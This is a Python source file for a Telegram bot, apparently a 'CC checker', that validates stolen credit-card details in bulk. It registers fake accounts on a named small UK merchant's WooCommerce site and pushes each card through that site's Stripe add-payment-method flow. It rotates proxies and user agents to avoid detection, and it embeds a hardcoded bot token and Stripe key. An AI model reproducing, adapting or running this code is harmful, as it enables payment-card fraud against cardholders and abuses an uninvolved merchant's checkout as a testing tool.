import requests
import asyncio
import json
import random
import re
import os
import uuid
import aiohttp
from fake_useragent import UserAgent
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import logging
from datetime import datetime
import warnings
from urllib.parse import urlparse

warnings.filterwarnings('ignore')

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = "8902368417:AAHQc8pd-VAJpw5UsrN3Iwec5m6RD_muwdo"

# Statistics
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0,
    'start_time': datetime.now()
}

# Global variables for processing
processing_cards = []
processing_status = {}
current_message_id = None
current_chat_id = None

# ────────────────────────── helper functions ──────────────────────────

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

# ─────────────────────────── proxy parser ────────────────────────────

def parse_proxy_line(line: str):
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = f"{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = f"{user}:{pwd}"
            address = f"{host}:{port}"
        else:
            return None
    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url

def load_proxies(file_path: str):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    except FileNotFoundError:
        logger.error(f"Proxy file not found: {file_path}")
    return proxies

# ──────────────────────── stripe auth logic (from stripe.py) ──────────

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
                         gets(payment_page_text, 'data-key="pk_', '"') or 
                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

# ──────────────────────── check_cc function ──────────────────────

async def check_cc(fullz, proxy_url=None):
    """Check a single credit card using stripe.py logic"""
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        
        card_data = {
            'number': cc.strip(),
            'exp_month': mes.strip(),
            'exp_year': ano.strip(),
            'cvc': cvv.strip()
        }
        
        is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy_url)
        
        response_lower = response_msg.lower()
        if 'requires_action' in response_lower or 'succeeded' in response_lower:
            return f"APPROVED ✅ - {response_msg}"
        elif is_approved:
            return f"APPROVED ✅ - {response_msg}"
        else:
            return f"DECLINED ❌ - {response_msg}"
            
    except Exception as e:
        return f"ERROR ⚠️ - {str(e)}"

# ──────────────────────── Telegram Bot Handlers ──────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message with inline buttons"""
    keyboard = [
        [
            InlineKeyboardButton("📊 Check CC", callback_data="check_cc"),
            InlineKeyboardButton("📈 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("📁 Check File", callback_data="check_file"),
            InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")
        ],
        [
            InlineKeyboardButton("⚙️ Proxy Settings", callback_data="proxy_settings"),
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    proxies = context.user_data.get('proxies', [])
    proxy_status = f"🔌 *Proxies: {len(proxies)} loaded*" if proxies else "🔌 *No proxies*"
    
    welcome_text = (
        "✨ *Welcome to CC Checker Bot!* ✨\n\n"
        "🔍 *I can help you validate credit cards*\n"
        "📌 *Send me cards in this format:*\n"
        "`5121078835045021|12|2041|111`\n\n"
        "📂 *Or send a .txt file with multiple cards*\n"
        "⚡ *Use /chk to start checking*\n\n"
        f"{proxy_status}\n\n"
        "🛠 *Choose an option below:*"
    )
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "check_cc":
        await query.edit_message_text(
            "📝 *Please send me the CC details*\n\n"
            "Format: `5121078835045021|12|2041|111`\n"
            "You can send multiple cards, one per line.\n\n"
            "_Send /cancel to stop_",
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_cc'] = True
        
    elif query.data == "check_file":
        await query.edit_message_text(
            "📂 *Please send me a .txt file*\n"
            "The file should contain one card per line.\n\n"
            "Format: `5121078835045021|12|2041|111`\n\n"
            "_Send /cancel to stop_",
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_file'] = True
        
    elif query.data == "stats":
        await show_stats(update, context)
        
    elif query.data == "reset_stats":
        await reset_stats(update, context)
        
    elif query.data == "help":
        await show_help(update, context)
        
    elif query.data == "back_to_menu":
        await back_to_menu(update, context)
    
    elif query.data == "proxy_settings":
        await proxy_settings_callback(update, context)
    
    elif query.data == "load_proxy":
        await load_proxy_handler(update, context)
    
    elif query.data == "show_proxies":
        await show_proxies_handler(update, context)
    
    elif query.data == "clear_proxies":
        await clear_proxies_handler(update, context)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    stats_text = (
        "📊 *━━━━━━ STATISTICS ━━━━━━* 📊\n\n"
        f"🕐 *Uptime:* `{hours}h {minutes}m`\n"
        f"📊 *Total Checked:* `{stats['total']}`\n\n"
        f"✅ *Approved:* `{stats['approved']}`\n"
        f"❌ *Declined:* `{stats['declined']}`\n"
        f"⚠️ *Unknown:* `{stats['unknown']}`\n"
        f"🚫 *Errors:* `{stats['errors']}`\n\n"
        f"📈 *Success Rate:* `{stats['approved']/stats['total']*100:.1f}%`" if stats['total'] > 0 else "📈 *Success Rate:* `0%`"
    )
    
    keyboard = [[InlineKeyboardButton("🔄 Refresh Stats", callback_data="stats")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            stats_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            stats_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def reset_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset statistics"""
    global stats
    stats = {
        'total': 0,
        'approved': 0,
        'declined': 0,
        'unknown': 0,
        'errors': 0,
        'start_time': datetime.now()
    }
    
    await update.callback_query.edit_message_text(
        "🔄 *Statistics have been reset!* ✅\n\n"
        "All counters are now at 0.",
        parse_mode='Markdown'
    )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    help_text = (
        "❓ *━━━━━━ HELP ━━━━━━* ❓\n\n"
        "🤖 *Bot Commands:*\n"
        "• `/start` - Welcome message\n"
        "• `/chk` - Start checking CCs\n"
        "• `/stats` - Show statistics\n"
        "• `/reset` - Reset statistics\n\n"
        "📝 *CC Format:*\n"
        "`5121078835045021|12|2041|111`\n"
        "*(card|month|year|cvv)*\n\n"
        "📂 *File Support:*\n"
        "Send a .txt file with cards\n"
        "One card per line\n\n"
        "⚙️ *Proxy Support:*\n"
        "Load proxies via Proxy Settings\n"
        "Format: `http://user:pass@host:port`\n\n"
        "⚡ *Tips:*\n"
        "• Use inline buttons for quick actions\n"
        "• Check stats to track your progress\n"
        "• Send /cancel to stop any operation"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to main menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [
            InlineKeyboardButton("📊 Check CC", callback_data="check_cc"),
            InlineKeyboardButton("📈 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("📁 Check File", callback_data="check_file"),
            InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")
        ],
        [
            InlineKeyboardButton("⚙️ Proxy Settings", callback_data="proxy_settings"),
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    proxies = context.user_data.get('proxies', [])
    proxy_status = f"🔌 *Proxies: {len(proxies)} loaded*" if proxies else "🔌 *No proxies*"
    
    await query.edit_message_text(
        "✨ *Welcome to CC Checker Bot!* ✨\n\n"
        "🔍 *I can help you validate credit cards*\n"
        "📌 *Send me cards in this format:*\n"
        "`5121078835045021|12|2041|111`\n\n"
        "📂 *Or send a .txt file with multiple cards*\n"
        "⚡ *Use /chk to start checking*\n\n"
        f"{proxy_status}\n\n"
        "🛠 *Choose an option below:*",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def proxy_settings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Proxy settings callback"""
    query = update.callback_query
    
    keyboard = [
        [InlineKeyboardButton("📂 Load Proxy File", callback_data="load_proxy")],
        [InlineKeyboardButton("📊 Show Proxies", callback_data="show_proxies")],
        [InlineKeyboardButton("🗑️ Clear Proxies", callback_data="clear_proxies")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    proxies = context.user_data.get('proxies', [])
    proxy_text = f"🔌 *Current Proxies: {len(proxies)} loaded*" if proxies else "🔌 *No proxies loaded*"
    
    await query.edit_message_text(
        f"⚙️ *Proxy Settings*\n\n"
        f"{proxy_text}\n\n"
        f"Choose an option:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def load_proxy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Load proxy file"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📂 *Please send me a .txt file with proxies*\n\n"
        "Format (one per line):\n"
        "`http://user:pass@host:port`\n"
        "`socks5://host:port`\n"
        "`host:port:user:pass`\n\n"
        "_Send /cancel to stop_",
        parse_mode='Markdown'
    )
    context.user_data['waiting_for_proxy'] = True

async def show_proxies_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show loaded proxies"""
    query = update.callback_query
    await query.answer()
    
    proxies = context.user_data.get('proxies', [])
    if not proxies:
        await query.edit_message_text(
            "⚠️ *No proxies loaded.*\n\n"
            "Use 'Load Proxy File' to add proxies.",
            parse_mode='Markdown'
        )
        return
    
    text = f"📊 *Loaded Proxies ({len(proxies)})*\n\n"
    for i, p in enumerate(proxies[:20], 1):
        text += f"{i}. `{p}`\n"
    if len(proxies) > 20:
        text += f"\n_...and {len(proxies)-20} more_"
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="proxy_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def clear_proxies_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all proxies"""
    query = update.callback_query
    await query.answer()
    
    context.user_data['proxies'] = []
    await query.edit_message_text(
        "🗑️ *All proxies have been cleared!*",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages and files"""
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    # Check for cancel command
    if update.message.text and update.message.text.lower() == '/cancel':
        context.user_data.clear()
        await update.message.reply_text(
            "❌ *Operation cancelled!*\n"
            "Use /start to begin again.",
            parse_mode='Markdown'
        )
        return
    
    # Handle proxy file upload
    if context.user_data.get('waiting_for_proxy'):
        if update.message.document:
            file = await update.message.document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            proxies = []
            for line in text.split('\n'):
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
            
            if proxies:
                context.user_data['proxies'] = proxies
                context.user_data['waiting_for_proxy'] = False
                await update.message.reply_text(
                    f"✅ *Loaded {len(proxies)} proxies!*\n\n"
                    f"🔌 First 5 proxies:\n" + "\n".join([f"• `{p}`" for p in proxies[:5]]),
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "❌ *No valid proxies found in file!*",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "❌ *Please send a text file!*",
                parse_mode='Markdown'
            )
        return
    
    # Handle CC input
    if context.user_data.get('waiting_for_cc'):
        text = update.message.text.strip()
        lines = text.split('\n')
        valid_cards = []
        
        for line in lines:
            if line.strip():
                if '|' in line and len(line.split('|')) == 4:
                    valid_cards.append(line.strip())
                else:
                    await update.message.reply_text(
                        f"❌ *Invalid format:* `{line}`\n"
                        f"Please use: `5121078835045021|12|2041|111`",
                        parse_mode='Markdown'
                    )
                    return
        
        if valid_cards:
            context.user_data['waiting_for_cc'] = False
            await process_cards(update, context, valid_cards)
        else:
            await update.message.reply_text(
                "❌ *No valid cards found!*\n"
                "Please send cards in the correct format.",
                parse_mode='Markdown'
            )
        return
    
    # Handle file upload
    if context.user_data.get('waiting_for_file'):
        if update.message.document:
            file = await update.message.document.get_file()
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            lines = text.split('\n')
            valid_cards = []
            
            for line in lines:
                if line.strip():
                    if '|' in line and len(line.split('|')) == 4:
                        valid_cards.append(line.strip())
            
            if valid_cards:
                context.user_data['waiting_for_file'] = False
                await process_cards(update, context, valid_cards)
            else:
                await update.message.reply_text(
                    "❌ *No valid cards found in file!*\n"
                    "Each line should be in format: `5121078835045021|12|2041|111`",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "❌ *Please send a text file!*\n"
                "Use /cancel to stop.",
                parse_mode='Markdown'
            )
        return
    
    # Handle /chk command
    if update.message.text and update.message.text.startswith('/chk'):
        await start_check(update, context)
        return
    
    # Handle unknown messages
    if update.message.text and not update.message.text.startswith('/'):
        await update.message.reply_text(
            "❓ *Unknown command or format*\n\n"
            "Use /start to see available options\n"
            "Or send cards in format:\n"
            "`5121078835045021|12|2041|111`",
            parse_mode='Markdown'
        )

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start checking process"""
    keyboard = [
        [
            InlineKeyboardButton("📝 Enter Cards", callback_data="check_cc"),
            InlineKeyboardButton("📁 Upload File", callback_data="check_file")
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔍 *Start CC Checking*\n\n"
        "Choose how you want to provide the cards:\n\n"
        "📝 *Option 1:* Enter cards manually\n"
        "📁 *Option 2:* Upload a .txt file\n\n"
        "_Each card should be in format:_\n"
        "`5121078835045021|12|2041|111`",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards):
    """Process multiple cards with progress bar"""
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    processing_cards = cards
    processing_status = {}
    current_chat_id = update.effective_chat.id
    
    # Load proxies from context
    proxies = context.user_data.get('proxies', [])
    
    # Send initial progress message
    progress_text = (
        "🔄 *Processing Cards*\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n\n"
        f"📊 *Total:* `{len(cards)}`\n"
        f"✅ *Approved:* `0`\n"
        f"❌ *Declined:* `0`\n"
        f"⚠️ *Unknown:* `0`\n"
        f"🚫 *Errors:* `0`\n"
        f"🔌 *Proxies:* `{len(proxies)}` loaded\n\n"
        "⏳ *Processing...*"
    )
    
    msg = await update.message.reply_text(
        progress_text,
        parse_mode='Markdown'
    )
    current_message_id = msg.message_id
    
    # Process cards
    async with aiohttp.ClientSession() as session:
        for i, card in enumerate(cards, 1):
            # Randomly select a proxy if available
            proxy = random.choice(proxies) if proxies else None
            result = await check_cc(card, proxy_url=proxy)
            processing_status[card] = result
            
            # Update stats
            stats['total'] += 1
            if 'APPROVED' in result:
                stats['approved'] += 1
            elif 'DECLINED' in result:
                stats['declined'] += 1
            elif 'ERROR' in result:
                stats['errors'] += 1
            else:
                stats['unknown'] += 1
            
            # Update progress bar
            progress = int((i / len(cards)) * 10)
            bar = "▰" * progress + "▱" * (10 - progress)
            percentage = int((i / len(cards)) * 100)
            
            progress_text = (
                f"🔄 *Processing Cards*\n\n"
                f"{bar} {percentage}%\n\n"
                f"📊 *Total:* `{len(cards)}`\n"
                f"✅ *Approved:* `{stats['approved']}`\n"
                f"❌ *Declined:* `{stats['declined']}`\n"
                f"⚠️ *Unknown:* `{stats['unknown']}`\n"
                f"🚫 *Errors:* `{stats['errors']}`\n"
                f"🔌 *Proxies:* `{len(proxies)}` loaded\n\n"
                f"⏳ *Processing...* `{i}/{len(cards)}`"
            )
            
            try:
                await context.bot.edit_message_text(
                    progress_text,
                    chat_id=current_chat_id,
                    message_id=current_message_id,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error updating progress: {e}")
            
            # Small delay to avoid rate limiting
            await asyncio.sleep(0.1)
    
    # Show results
    await show_results(update, context)

async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show final results with inline buttons"""
    global processing_cards, processing_status, current_message_id, current_chat_id
    
    # Split results into approved, declined, etc.
    approved = []
    declined = []
    unknown = []
    errors = []
    
    for card, result in processing_status.items():
        if 'APPROVED' in result:
            approved.append((card, result))
        elif 'DECLINED' in result:
            declined.append((card, result))
        elif 'ERROR' in result:
            errors.append((card, result))
        else:
            unknown.append((card, result))
    
    results_text = (
       
        "✅ *━━━━━━ RESULTS ━━━━━━* ✅\n\n"
        f"📊 *Total:* `{len(processing_cards)}`\n"
        f"✅ *Approved:* `{len(approved)}`\n"
        f"❌ *Declined:* `{len(declined)}`\n"
        f"⚠️ *Unknown:* `{len(unknown)}`\n"
        f"🚫 *Errors:* `{len(errors)}`\n\n"
    )
    
    # Add approved cards
    if approved:
        results_text += "✅ *APPROVED CARDS:*\n"
        for card, result in approved[:10]:  # Show first 10
            results_text += f"• `{card}` - {result}\n"
        if len(approved) > 10:
            results_text += f"_...and {len(approved)-10} more_\n"
        results_text += "\n"
    
    # Add declined cards
    if declined:
        results_text += "❌ *DECLINED CARDS:*\n"
        for card, result in declined[:5]:  # Show first 5
            results_text += f"• `{card}` - {result}\n"
        if len(declined) > 5:
            results_text += f"_...and {len(declined)-5} more_\n"
        results_text += "\n"
    
    # Add error cards
    if errors:
        results_text += "🚫 *ERROR CARDS:*\n"
        for card, result in errors[:3]:
            results_text += f"• `{card}` - {result}\n"
        if len(errors) > 3:
            results_text += f"_...and {len(errors)-3} more_\n"
        results_text += "\n"
    
    keyboard = [
        [
            InlineKeyboardButton("📊 Check More", callback_data="check_cc"),
            InlineKeyboardButton("📈 Full Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.edit_message_text(
            results_text,
            chat_id=current_chat_id,
            message_id=current_message_id,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error showing results: {e}")
        await context.bot.send_message(
            chat_id=current_chat_id,
            text=results_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    # Clear processing variables
    processing_cards = []
    processing_status = {}
    current_message_id = None
    current_chat_id = None

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel current operation"""
    context.user_data.clear()
    await update.message.reply_text(
        "❌ *Operation cancelled!*\n"
        "Use /start to begin again.",
        parse_mode='Markdown'
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.warning(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", start_check))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("reset", reset_stats))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("help", show_help))
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Add message handler
    application.add_handler(MessageHandler(
        filters.TEXT | filters.Document.ALL, 
        handle_message
    ))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start the bot
    print("🤖 Bot started! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()